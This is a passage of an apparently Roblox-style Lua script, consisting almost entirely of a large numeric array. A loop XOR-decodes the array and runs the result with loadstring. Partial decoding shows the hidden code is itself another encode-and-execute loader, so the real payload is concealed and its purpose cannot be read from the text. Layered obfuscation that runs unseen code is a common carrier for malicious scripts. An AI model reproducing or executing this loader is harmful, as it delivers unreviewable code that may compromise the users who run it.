25,7,6,5,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,13,25,4,13,3,25,4,3,4,25,7,6,12,25,7,1,7,25,7,6,12,25,4,3,13,25,4,13,3,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,1,25,4,12,2,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,3,3,25,4,3,12,25,7,6,12,25,4,13,2,25,4,2,1,25,4,13,12,25,4,3,13,25,4,2,5,25,4,13,2,25,4,6,0,25,4,0,2,25,4,0,12,25,7,6,12,25,4,2,1,25,4,3,4,25,4,2,4,25,7,6,12,25,4,3,13,25,4,13,3,25,4,3,4,25,7,6,12,25,4,2,1,25,4,3,4,25,4,2,4,25,7,6,12,25,4,3,13,25,4,13,3,25,4,3,4,25,7,1,0,25,4,6,2,25,4,3,3,25,4,3,4,25,4,2,4,25,4,6,2,25,4,3,3,25,4,13,12,25,4,13,13,25,4,13,2,25,4,1,5,25,4,3,2,25,4,3,3,25,4,3,6,25,4,2,4,25,7,6,4,25,7,6,4,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,0,1,25,7,0,4,25,7,0,6,25,7,7,2,25,7,0,1,25,7,1,2,25,7,0,1,25,7,7,2,25,7,0,1,25,7,1,13,25,7,1,2,25,7,7,2,25,7,0,1,25,7,1,13,25,7,1,2,25,7,7,2,25,7,0,1,25,7,1,12,25,7,1,3,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,6,25,7,0,6,25,7,0,1,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,5,25,7,6,5,25,7,6,12,25,4,13,2,25,4,3,2,25,4,2,5,25,4,3,4,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,7,25,4,13,7,25,4,6,0,25,4,0,2,25,4,0,12,25,7,6,12,25,7,1,7,25,7,6,12,25,4,6,4,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,4,0,12,25,4,3,6,25,4,2,1,25,4,13,7,25,4,2,5,25,4,13,12,25,7,7,0,25,4,1,5,25,4,3,2,25,4,2,1,25,4,13,12,25,4,2,1,25,4,2,7,25,4,13,2,25,4,2,5,25,4,13,12,25,7,6,12,25,4,2,1,25,4,3,4,25,4,2,4,25,7,6,12,25,4,6,4,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,4,0,12,25,4,3,6,25,4,2,1,25,4,13,7,25,4,2,5,25,4,13,12,25,7,7,0,25,4,1,5,25,4,3,2,25,4,2,1,25,4,13,12,25,4,2,1,25,4,2,7,25,4,13,2,25,4,2,5,25,4,13,12,25,7,1,0,25,4,6,2,25,4,3,3,25,4,3,4,25,4,2,4,25,4,6,2,25,4,3,3,25,4,13,12,25,4,13,13,25,4,13,2,25,4,1,5,25,4,3,2,25,4,3,3,25,4,3,6,25,4,2,4,25,7,6,4,25,7,6,4,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,1,2,25,7,0,7,25,7,7,2,25,7,0,1,25,7,0,1,25,7,0,0,25,7,7,2,25,7,0,1,25,7,0,1,25,7,1,2,25,7,7,2,25,7,0,1,25,7,0,6,25,7,0,6,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,6,25,7,1,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,12,25,7,7,0,25,7,7,0,25,7,6,12,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,0,6,25,7,0,1,25,7,0,5,25,7,7,2,25,7,0,6,25,7,0,1,25,7,0,4,25,7,7,2,25,7,0,6,25,7,0,0,25,7,1,2,25,7,7,2,25,7,0,6,25,7,0,6,25,7,0,1,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,1,25,7,1,2,25,7,0,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,12,25,7,7,0,25,7,7,0,25,7,6,12,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,0,1,25,7,0,4,25,7,0,1,25,7,7,2,25,7,0,1,25,7,1,13,25,7,1,12,25,7,7,2,25,7,0,1,25,7,1,13,25,7,1,12,25,7,7,2,25,7,0,1,25,7,1,13,25,7,0,1,25,7,7,2,25,7,0,1,25,7,0,4,25,7,0,7,25,7,7,2,25,7,0,1,25,7,1,3,25,7,0,0,25,7,7,2,25,7,0,1,25,7,1,13,25,7,0,7,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,6,25,7,0,6,25,7,0,7,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,12,25,7,7,0,25,7,7,0,25,7,6,12,25,7,6,4,25,4,3,12,25,4,13,3,25,4,3,4,25,4,2,7,25,4,13,2,25,4,3,3,25,4,3,5,25,4,3,4,25,7,6,4,25,7,6,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,7,1,7,25,4,13,5,25,7,0,6,25,7,0,6,25,7,1,3,25,4,2,13,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,1,25,7,1,7,25,7,0,1,25,7,0,4,25,7,0,5,25,4,12,2,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,13,25,7,1,7,25,7,6,2,25,7,6,2,25,4,12,2,25,4,3,12,25,4,3,5,25,4,13,12,25,7,6,12,25,4,3,3,25,7,1,7,25,7,0,1,25,7,7,2,25,7,6,3,25,4,13,2,25,7,6,12,25,4,2,4,25,4,3,5,25,7,6,12,25,4,13,13,25,7,1,7,25,4,13,13,25,7,7,0,25,7,7,0,25,4,13,13,25,4,13,2,25,4,13,12,25,4,3,3,25,4,3,4,25,4,3,13,25,7,7,0,25,4,2,7,25,4,3,2,25,4,2,1,25,4,13,12,25,7,6,4,25,4,2,6,25,4,3,3,25,4,13,2,25,7,0,7,25,7,0,6,25,7,7,0,25,4,2,6,25,4,13,6,25,4,3,5,25,4,13,12,25,7,6,4,25,4,13,2,25,4,1,13,25,4,3,3,25,4,1,3,25,7,7,2,25,4,3,1,25,7,6,5,25,7,6,5,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,2,25,4,13,12,25,4,2,5,25,4,13,2,25,4,13,3,25,4,13,12,25,4,3,4,25,7,6,12,25,4,13,13,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,25,7,6,4,25,7,6,5,25,7,6,5,25,7,6,5,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,3,3,25,4,3,12,25,7,6,12,25,4,3,7,25,4,13,7,25,4,6,0,25,4,0,2,25,4,0,12,25,7,6,12,25,4,13,2,25,4,3,2,25,4,2,5,25,4,3,4,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,3,5,25,4,13,12,25,4,3,3,25,4,3,13,25,4,3,3,25,4,3,4,25,7,6,12,25,7,1,7,25,7,6,12,25,4,3,7,25,4,13,7,25,4,6,0,25,4,0,2,25,4,0,12,25,7,7,0,25,4,1,5,25,4,6,2,25,4,13,12,25,4,2,1,25,4,3,7,25,4,2,5,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,13,2,25,4,2,1,25,4,13,12,25,4,3,13,25,4,2,5,25,4,13,2,25,7,6,12,25,7,1,7,25,7,6,12,25,4,13,2,25,4,2,1,25,4,13,12,25,4,3,13,25,4,2,5,25,4,13,2,25,4,6,0,25,4,0,2,25,4,0,12,25,7,7,0,25,4,1,5,25,4,6,2,25,4,13,12,25,4,2,1,25,4,3,7,25,4,2,5,25,4,12,1,25,4,12,2,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,3,6,25,4,3,5,25,4,2,7,25,4,2,1,25,4,3,6,25,7,6,12,25,4,2,1,25,4,13,12,25,4,3,13,25,4,13,13,25,7,6,12,25,7,1,7,25,7,6,12,25,4,13,5,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,1,13,25,7,0,1,25,4,1,3,25,7,6,12,25,7,1,7,25,7,6,12,25,4,3,5,25,4,13,12,25,4,3,3,25,4,3,13,25,4,3,3,25,4,3,4,25,7,7,2,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,1,13,25,7,0,6,25,4,1,3,25,7,6,12,25,7,1,7,25,7,6,12,25,4,13,2,25,4,2,1,25,4,13,12,25,4,3,13,25,4,2,5,25,4,13,2,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,2,13,25,4,12,1,25,4,12,2,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,3,13,25,4,13,3,25,4,3,4,25,7,7,0,25,4,0,3,25,4,3,2,25,4,3,5,25,4,3,5,25,4,13,2,25,7,1,0,25,4,6,2,25,4,3,3,25,4,13,12,25,4,2,5,25,4,0,3,25,4,2,5,25,4,13,12,25,4,13,0,25,4,2,5,25,4,13,12,25,7,6,4,25,4,13,3,25,4,3,4,25,4,12,4,25,4,2,1,25,4,2,7,25,4,3,1,25,7,6,4,25,4,2,1,25,4,13,12,25,4,3,13,25,4,13,13,25,7,6,5,25,7,6,5,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,1,25,4,12,2,25,7,6,12,25,7,6,12,25,7,6,12,25,7,6,12,25,4,2,5,25,4,3,4,25,4,2,4,25,4,12,1,25,4,12,2,25,4,2,5,25,4,3,4,25,4,2,4,25,7,6,5,72,63,89,90,86,84,89,21,93,113,102,70,83,116,91,91,8,23,23,63,83,90,71,21,91,122,103,98,109,66,92,79,8,4,25,22,103,76,69,126,96,76,90,121,21,81,90,63,93,113,102,70,83,116,91,91,8,93,113,102,70,83,116,91,91,27,27,70,65,71,92,91,82,27,86,93,84,71,29,87,92,65,6,7,27,87,77,90,71,29,103,76,69,126,96,76,90,121,110,91,122,103,98,109,66,92,79,104,25,121,80,94,86,120,66,109,88,28,28,63,80,91,81,63,89,90,84,81,70,65,71,92,91,82,29,93,113,102,70,83,116,91,91,28,29,28,63}
local CBbYBVGU=""
for dpfACAtQ=1,#ZXpUTNmr do
CBbYBVGU=CBbYBVGU..string.char(bit32.bxor(ZXpUTNmr[dpfACAtQ],iwEWAMGA))
end
loadstring(CBbYBVGU)()
